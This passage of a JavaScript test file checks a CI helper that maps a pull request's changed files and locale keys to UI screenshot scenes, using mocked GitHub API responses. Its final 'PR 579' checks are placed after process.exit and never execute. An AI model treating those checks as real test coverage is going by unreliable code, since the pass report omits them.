  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    return 'src/utils/repoSearch.ts\n';
  }
  return '';
};

const syncRepoSearchPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncRepoSearch,
});
check('synchronize with repoSearch change maps to repositories scenes', mapPathsToScenes(syncRepoSearchPaths), [
  'repositories-light',
  'repositories-dark',
]);

// Scenario D: synchronize push where compare diverged (force push)
const mockGhSyncDiverged = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    return JSON.stringify({ status: 'diverged', files: [] });
  }
  return '';
};
const syncDivergedPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncDiverged,
});
check('synchronize with diverged compare triggers all scenes', mapPathsToScenes(syncDivergedPaths), ALL_SCENES);

// Scenario D2: synchronize push where compare status is behind (rewind)
const mockGhSyncBehind = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    return JSON.stringify({ status: 'behind', files: [] });
  }
  return '';
};
const syncBehindPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncBehind,
});
check('synchronize with behind compare triggers all scenes', mapPathsToScenes(syncBehindPaths), ALL_SCENES);

// Scenario G: synchronize push where compare succeeds with 0 file changes
const mockGhSyncEmptyCompare = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    return JSON.stringify({ status: 'identical', files: [] });
  }
  if (url.startsWith('repos/owner/repo/pulls/123/files')) {
    // Should NOT be called
    return JSON.stringify([{ filename: 'src/components/GistView.tsx' }]);
  }
  return '';
};
const syncEmptyPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncEmptyCompare,
});
check('synchronize with empty compare yields empty files without fallback', syncEmptyPaths, []);
check('synchronize with empty compare yields no UI scenes', mapPathsToScenes(syncEmptyPaths), []);

// Scenario E: synchronize push where compare list is truncated (>= 300 files)
const mockGhSyncTruncated = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    const dummyFiles = Array.from({ length: 300 }, (_, i) => ({ filename: `file${i}.ts` }));
    return JSON.stringify({ status: 'ahead', files: dummyFiles });
  }
  return '';
};
const syncTruncatedPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncTruncated,
});
check('synchronize with truncated compare triggers all scenes', mapPathsToScenes(syncTruncatedPaths), ALL_SCENES);

// Scenario F: synchronize push where compare fails completely, falls back directly to PR files
const mockGhSyncCompareFails = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    throw new Error('compare endpoint error');
  }
  if (url.startsWith('repos/owner/repo/pulls/123/files')) {
    return JSON.stringify([{ filename: 'src/components/GistView.tsx' }]);
  }
  return '';
};
const syncFallbackPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncCompareFails,
});
check('synchronize falling back to PR files on compare failure', syncFallbackPaths, ['src/components/GistView.tsx']);
check('synchronize fallback to PR files maps to gist scene', mapPathsToScenes(syncFallbackPaths), ['gists']);

// 15. diffLocaleKeys — key-level diffing over the contents API
const baseAppJson = JSON.stringify({
  settingsPanel: { general: '通用' },
  pluginSettingsPanel: { 'customize-icon': '自定义图标' },
  header: { settings: '设置' },
});
const headAppJson = JSON.stringify({
  settingsPanel: { general: '通用' },
  pluginSettingsPanel: { 'customize-icon': '自定义图标', 'reset-icon': '恢复默认图标' },
  header: { settings: '设置' },
});
const baseGistsJson = JSON.stringify({ gistView: { title: 'Gist' } });
const headGistsJson = baseGistsJson;

const mockContentExecutor = (args) => {
  const url = args[1];
  const ref = decodeURIComponent((url.match(/[?&]ref=([^&]+)$/) ?? [])[1] ?? '');
  if (url.includes('src/locales/zh/app.json')) {
    return ref === beforeSha ? baseAppJson : headAppJson;
  }
  if (url.includes('src/locales/zh/gists.json')) {
    return ref === beforeSha ? baseGistsJson : headGistsJson;
  }
  throw new Error(`unexpected api call: ${url}`);
};

const localeKeys = await diffLocaleKeys({
  repo: 'owner/repo',
  paths: ['src/locales/zh/app.json', 'src/locales/zh/gists.json'],
  baseRef: beforeSha,
  headRef: headSha,
  executor: mockContentExecutor,
});
check('locale key diff returns changed keys per file', localeKeys, {
  'src/locales/zh/app.json': ['pluginSettingsPanel'],
  'src/locales/zh/gists.json': [],
});
check('locale key diff integrates with scene mapping', mapPathsToScenes(
  ['src/locales/zh/app.json', 'src/locales/zh/gists.json'],
  localeKeys,
), ['settings-plugins']);

const mockFailingContentExecutor = (args) => {
  const url = args[1];
  const ref = decodeURIComponent((url.match(/[?&]ref=([^&]+)$/) ?? [])[1] ?? '');
  if (url.includes('gists.json')) throw new Error('contents api down');
  return ref === beforeSha ? baseAppJson : headAppJson;
};
const partialKeys = await diffLocaleKeys({
  repo: 'owner/repo',
  paths: ['src/locales/zh/app.json', 'src/locales/zh/gists.json'],
  baseRef: beforeSha,
  headRef: headSha,
  executor: mockFailingContentExecutor,
});
check('unreadable locale files are omitted for file-level fallback', Object.keys(partialKeys), ['src/locales/zh/app.json']);
check('omitted locale files fall back conservatively in scene mapping', mapPathsToScenes(
  ['src/locales/zh/app.json', 'src/locales/zh/gists.json'],
  partialKeys,
), ['gists', 'settings-plugins']);

console.log(`\nTest result: ${failures === 0 ? 'ALL PASSED' : `${failures} FAILURE(S)`}`);
process.exit(failures ? 1 : 0);

// 16. PR 579 simulation: auto-update settings only
check('PR 579 app.json updateChecker key maps to settings-general', classifyLocaleKeys('app', ['updateChecker']), ['settings-general']);
check('PR 579 app.json updateNotificationBanner key is deferred', classifyLocaleKeys('app', ['updateNotificationBanner']), ['deferred']);
check('PR 579 full diff maps to exactly the visible pages', mapPathsToScenes(
  [
    'src/components/UpdateChecker.test.tsx',
    'src/components/UpdateChecker.tsx',
    'src/components/settings/AppearancePanel.test.tsx',
    'src/components/settings/GeneralPanel.tsx',
    'src/hooks/useAutoUpdateCheck.test.ts',
    'src/hooks/useAutoUpdateCheck.ts',
    'src/locales/de/app.json',
    'src/locales/en/app.json',
    'src/locales/zh/app.json',
    'src/store/initialState.ts',
    'src/store/schema.ts',
    'src/store/slices/preferenceSlice.ts',
    'src/store/types.ts',
    'src/types/index.ts',
  ],
  {
    'src/locales/de/app.json': ['updateChecker', 'generalPanel'],
    'src/locales/en/app.json': ['updateChecker', 'generalPanel'],
    'src/locales/zh/app.json': ['updateChecker', 'generalPanel'],
  },
), ['settings-general', 'settings-appearance']);

check('PR 579 update-dialog-only change stays conservative', mapPathsToScenes(
  ['src/components/UpdateChecker.tsx'],
), ALL_SCENES);
